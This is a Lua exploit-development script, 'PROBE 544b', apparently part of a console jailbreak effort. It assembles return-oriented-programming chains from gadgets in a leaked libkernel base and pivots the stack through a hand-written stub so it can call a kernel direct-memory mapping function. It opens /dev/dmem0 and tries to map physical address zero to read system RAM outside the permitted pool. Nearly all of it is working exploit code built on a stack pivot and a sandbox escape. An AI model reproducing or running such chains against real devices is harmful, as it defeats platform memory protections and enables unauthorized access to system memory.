-- CRASH_CLASS: MODERATE
-- PROBE 544b: MapDirectMemory via loader ropchain with 7th arg on stack
--
-- MapDirectMemory(virtAddrOut, len, prot, flags, physAddr, alignment, name)
-- 7 args: 6 in registers, 7th (name) on stack at [RSP+8] at function entry.
--
-- Previous attempts (532a/532b) crashed inside the wrapper because the
-- thr_create(430) child had a minimal fake TCB — wrapper accesses TLS.
-- The loader's thread:new uses Thrd_create+longjmp with real TLS.
--
-- Strategy: Build the whole fcall stub manually using push_write_qword_memory
-- in the ropchain, so we control the exact layout including the 7th arg.
-- Then pivot RSP to our custom stub to call MapDirectMemory.
--
-- Custom stub layout (5 qwords at a known address):
--   [stub+0x00]: MapDirectMemory address     ← RSP after pivot, ret pops this
--   [stub+0x08]: pop_rbx;ret gadget           ← MapDM's return address
--   [stub+0x10]: 0x0 (7th arg = name = NULL)  ← popped by pop_rbx, discarded
--   [stub+0x18]: pop_rsp;ret gadget            ← next after pop_rbx
--   [stub+0x20]: chain_resume_addr             ← RSP pivot back to main chain
--
-- Flow: MapDM ret → pop_rbx(0) → ret → pop_rsp(resume) → ret → chain continues

print("=== PROBE 544b: MapDirectMemory 7-ARG ===")
io.stdout:setvbuf("no")

local function to_num(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function make_syscall(num)
    local t = {}
    for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = num
    setmetatable(t, getmetatable(syscall.pipe))
    return t
end
local function q(v)
    if type(v) == "table" and v.h then
        local h, l = v.h, v.l
        if h < 0 then h = h + 0x100000000 end
        if l < 0 then l = l + 0x100000000 end
        return string.format("0x%08X%08X", h, l)
    end
    return string.format("0x%X", to_num(v))
end
local function wd(a, v) return pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) return pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return to_num(v) end; return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end; return nil
end

-- [A] Setup
print("[A] setup")
local pid = to_num(syscall.getpid())
print("  pid=" .. pid)

if not libkernel_base then
    print("FATAL: libkernel_base not available")
    return
end
print("  libkernel=" .. q(libkernel_base))

local map_fn = libkernel_base + uint64(0x15020)   -- sceKernelMapDirectMemory
local alloc_fn = libkernel_base + uint64(0x17EF0) -- sceKernelAllocateDirectMemory
print("  MapDM=" .. q(map_fn))
print("  AllocDM=" .. q(alloc_fn))

if not gadgets["pop rbx; ret"] or not gadgets["pop rsp; ret"] then
    print("FATAL: missing gadgets")
    return
end
print("  pop_rbx_ret=" .. q(gadgets["pop rbx; ret"]))
print("  pop_rsp_ret=" .. q(gadgets["pop rsp; ret"]))

-- [B] Get a physical address
print("")
print("[B] get physical address")

local phys_addr = nil

-- Try AllocateDirectMemory (may fail ENOMEM if pool exhausted)
local phys_out = memory.alloc(8)
wq(phys_out, uint64(0))

local alloc_chain = ropchain({ fcall_stub_padding_size = 0x50000 })
alloc_chain:push_fcall_with_ret(alloc_fn,
    uint64(0), uint64("0x150000000"), uint64(0x4000),
    uint64(0x4000), uint64(0), uint64(phys_out)
)
local ok_at, alloc_thr = pcall(function() return thread:new(alloc_chain) end)
if ok_at then
    local ok_ar = pcall(function() alloc_thr:run(true) end)
    if ok_ar then
        pcall(function() alloc_thr:join() end)
        local alloc_rv = rq(alloc_chain:get_last_retval_addr())
        local pv = rq(phys_out)
        print("  AllocDM rv=" .. q(alloc_rv) .. " phys=" .. q(pv))
        if to_num(alloc_rv) == 0 and pv and to_num(pv) ~= 0 then
            phys_addr = pv
            print("  *** using AllocDM phys ***")
        else
            print("  AllocDM failed (ENOMEM?), trying dmem0 fallback")
        end
    end
end

-- Fallback: verify a known pool offset via mmap+dmem0
if not phys_addr then
    phys_addr = uint64("0x110000000")
    print("  fallback phys=" .. q(phys_addr))

    local sc_open = make_syscall(5)
    local devpath = memory.alloc(32)
    for off = 0, 28, 4 do wd(devpath + off, 0) end
    wd(devpath + 0, 0x7665642F)  -- "/dev"
    wd(devpath + 4, 0x656D642F)  -- "/dme"
    wd(devpath + 8, 0x0000306D)  -- "m0\0"
    local ok_o, dmem_fd = pcall(function()
        return sc_open(uint64(devpath), uint64(0x10002), uint64(0))
    end)
    print("  dmem0 fd=" .. q(dmem_fd))

    local pool_off = phys_addr - uint64("0x100000000")
    local sc_mmap = make_syscall(477)
    local ok_mm, mmap_va = pcall(function()
        return sc_mmap(uint64(0), uint64(0x4000), uint64(3),
            uint64(0x0001), dmem_fd, pool_off)
    end)
    if ok_mm and mmap_va then
        local mva = to_num(mmap_va); if mva < 0 then mva = mva + 0x100000000 end
        if mva > 0x1000 then
            print("  dmem0 verify OK at " .. q(mmap_va))
            pcall(function() make_syscall(73)(mmap_va, uint64(0x4000)) end) -- munmap
        else
            print("  dmem0 verify FAILED, trying offset 0")
            phys_addr = uint64("0x100000000")
        end
    end
    pcall(function() make_syscall(6)(dmem_fd) end) -- close
end

print("  phys_addr=" .. q(phys_addr))

-- [C] Build MapDirectMemory chain with manual 7-arg stub
print("")
print("[C] MapDirectMemory chain (7-arg, manual stub)")

local virt_out = memory.alloc(8)
wq(virt_out, uint64(0))

-- Allocate a separate buffer for our custom stub (5 qwords = 40 bytes)
local custom_stub = memory.alloc(0x100)
for off = 0, 0xFC, 4 do wd(custom_stub + off, 0) end
print("  custom_stub=" .. q(custom_stub))

-- Build the chain. We DON'T use push_fcall_raw — we build it all manually.
-- The chain will:
-- 1. Set up 6 register args via push_sysv
-- 2. Write the 5-slot custom stub using push_write_qword_memory
-- 3. Pivot RSP to custom_stub → ret → MapDirectMemory
-- 4. MapDirectMemory returns → pop_rbx(NULL) → pop_rsp(resume) → chain continues
-- 5. Store retval

local chain = ropchain({
    fcall_stub_padding_size = 0x50000,
    stack_size = 0x8000  -- larger stack for all the writes
})

-- Step 1: Write stub[0] = MapDirectMemory address
chain:push_write_qword_memory(custom_stub + uint64(0x00), map_fn)

-- Step 2: Write stub[1] = pop_rbx;ret (return addr for MapDM)
chain:push_write_qword_memory(custom_stub + uint64(0x08), gadgets["pop rbx; ret"])

-- Step 3: Write stub[2] = 0 (7th arg = name = NULL)
chain:push_write_qword_memory(custom_stub + uint64(0x10), 0)

-- Step 4: Write stub[3] = pop_rsp;ret
chain:push_write_qword_memory(custom_stub + uint64(0x18), gadgets["pop rsp; ret"])

-- Step 5: Write stub[4] = chain resume address
-- This is the tricky part — we need to know where the chain will be
-- AFTER the RSP pivot returns. We use a forward reference:
-- After the pivot instruction, the chain continues at the next push.
-- We need push_set_rsp(custom_stub) followed by the resume point.
-- The resume address is: current RSP + size_of_remaining_instructions

-- To handle the forward reference, we use the chain's own mechanism:
-- push_sysv first, then write the resume addr, then pivot.

-- Set up registers BEFORE pivoting (they stay set during the stub execution)
chain:push_sysv(
    uint64(virt_out),      -- rdi: virtAddrOut
    uint64(0x4000),        -- rsi: length (1 page = 16KB)
    uint64(3),             -- rdx: prot (PROT_READ|PROT_WRITE)
    uint64(0),             -- rcx: flags (0)
    phys_addr,             -- r8: physical address
    uint64(0x4000)         -- r9: alignment
)

-- Now we need to write the resume address into stub[4], then pivot.
-- The resume point is right after the pivot instruction.
-- push_set_rsp takes 2 slots (pop_rsp;ret + value). After that = resume point.

-- Calculate: resume = current_rsp + sizeof(write_resume) + sizeof(pivot)
-- write_resume = push_write_qword_memory = push_set_rax(v) + push_store_rax_into_memory(addr)
--              = (pop_rax;ret + v) + (pop_rdi;ret + addr + mov_[rdi]_rax;ret)
--              = 5 qwords = 40 bytes
-- pivot = push_set_rsp(custom_stub) = pop_rsp;ret + custom_stub = 2 qwords = 16 bytes
-- total = 56 bytes
-- resume = chain:get_rsp() + 56

local resume_addr = chain:get_rsp() + uint64(56)

-- Write resume addr into stub[4]
chain:push_write_qword_memory(custom_stub + uint64(0x20), resume_addr)

-- Pivot RSP to custom stub
chain:push_set_rsp(custom_stub)

-- === RESUME POINT === (chain continues here after MapDM returns via stub)
-- Store the return value (rax) from MapDirectMemory
chain:push_store_retval()

print("  chain built, stack_offset=" .. chain.stack_offset)
print("  resume_addr=" .. q(resume_addr))

-- Verify stub is still zeroed (chain hasn't executed yet)
print("  stub before exec:")
for off = 0, 0x28, 8 do
    local v = rq(custom_stub + uint64(off))
    print(string.format("    [+0x%02X] %s", off, v and q(v) or "FAULT"))
end

-- [D] Execute via thread:new
print("")
print("[D] execute")
local ok_mt, map_thr = pcall(function() return thread:new(chain) end)
if not ok_mt then print("  thread:new FAIL: " .. tostring(map_thr)); return end

print("  running...")
local ok_mr, err_mr = pcall(function() map_thr:run(true) end)
print("  run ok=" .. tostring(ok_mr) .. " err=" .. tostring(err_mr))

if ok_mr then
    print("  joining...")
    local ok_mj, err_mj = pcall(function() map_thr:join() end)
    print("  join ok=" .. tostring(ok_mj) .. " err=" .. tostring(err_mj))

    -- Read results
    local map_rv = rq(chain:get_last_retval_addr())
    local virt_addr = rq(virt_out)
    print("  map_rv=" .. q(map_rv) .. " (0=success)")
    print("  virt_addr=" .. q(virt_addr))

    -- Dump stub after execution (should show our written values)
    print("  stub after exec:")
    for off = 0, 0x28, 8 do
        local v = rq(custom_stub + uint64(off))
        print(string.format("    [+0x%02X] %s", off, v and q(v) or "FAULT"))
    end

    if map_rv and to_num(map_rv) == 0 and virt_addr and to_num(virt_addr) ~= 0 then
        print("  *** MapDirectMemory SUCCEEDED ***")

        -- Verify R/W
        local ok_w = pcall(function() memory.write_dword(virt_addr, 0xDEADBEEF) end)
        local readback = rd(to_num(virt_addr))
        if readback then
            if readback < 0 then readback = readback + 0x100000000 end
            print(string.format("  write 0xDEADBEEF -> read 0x%08X", readback))
            if readback == 0xDEADBEEF then
                print("  *** R/W VERIFIED ***")
            end
        else
            print("  read FAULT at virt_addr")
        end
    else
        print("  MapDirectMemory FAILED")
        if map_rv then
            local rv_n = to_num(map_rv)
            if rv_n < 0 then rv_n = rv_n + 0x100000000 end
            print(string.format("  rv=0x%X (SCE error)", rv_n))
        end
    end
else
    print("  thread crashed")
end

-- [E] Test out-of-pool map (phys 0x0 = system RAM base)
-- Only if section D succeeded
print("")
print("[E] out-of-pool test")
local d_rv = rq(chain:get_last_retval_addr())
if d_rv and to_num(d_rv) == 0 then
    print("  D succeeded, trying phys 0x0 (system RAM)")

    local virt_out2 = memory.alloc(8)
    wq(virt_out2, uint64(0))
    local custom_stub2 = memory.alloc(0x100)
    for off = 0, 0xFC, 4 do wd(custom_stub2 + off, 0) end

    local chain2 = ropchain({
        fcall_stub_padding_size = 0x50000,
        stack_size = 0x8000
    })

    chain2:push_write_qword_memory(custom_stub2 + uint64(0x00), map_fn)
    chain2:push_write_qword_memory(custom_stub2 + uint64(0x08), gadgets["pop rbx; ret"])
    chain2:push_write_qword_memory(custom_stub2 + uint64(0x10), 0)
    chain2:push_write_qword_memory(custom_stub2 + uint64(0x18), gadgets["pop rsp; ret"])

    chain2:push_sysv(
        uint64(virt_out2),     -- rdi: virtAddrOut
        uint64(0x4000),        -- rsi: length
        uint64(1),             -- rdx: PROT_READ only
        uint64(0),             -- rcx: flags
        uint64(0),             -- r8: phys addr 0 (system RAM base)
        uint64(0x4000)         -- r9: alignment
    )

    local resume2 = chain2:get_rsp() + uint64(56)
    chain2:push_write_qword_memory(custom_stub2 + uint64(0x20), resume2)
    chain2:push_set_rsp(custom_stub2)
    chain2:push_store_retval()

    local ok_t2, thr2 = pcall(function() return thread:new(chain2) end)
    if ok_t2 then
        local ok_r2 = pcall(function() thr2:run(true) end)
        if ok_r2 then
            pcall(function() thr2:join() end)
            local rv2 = rq(chain2:get_last_retval_addr())
            local va2 = rq(virt_out2)
            print("  map_rv=" .. q(rv2))
            print("  virt_addr=" .. q(va2))

            if rv2 and to_num(rv2) == 0 and va2 and to_num(va2) ~= 0 then
                print("  *** OUT-OF-POOL MAP SUCCEEDED — SYSTEM RAM ACCESS ***")
                print("  reading phys 0x0:")
                for off = 0, 0x1C, 4 do
                    local b = rd(to_num(va2) + off)
                    if b then
                        if b < 0 then b = b + 0x100000000 end
                        print(string.format("    [0x%02X] 0x%08X", off, b))
                    else
                        print(string.format("    [0x%02X] FAULT", off))
                    end
                end
            else
                print("  out-of-pool FAILED (expected if pool-validated)")
            end
        else
            print("  thread crashed on out-of-pool test")
        end
    end
else
    print("  D failed, skipping E")
end

-- Canary
print("")
local ok_c, pid_c = pcall(function() return to_num(syscall.getpid()) end)
print("canary: ok=" .. tostring(ok_c) .. " pid=" .. tostring(pid_c))

print("=== PROBE 544b COMPLETE ===")
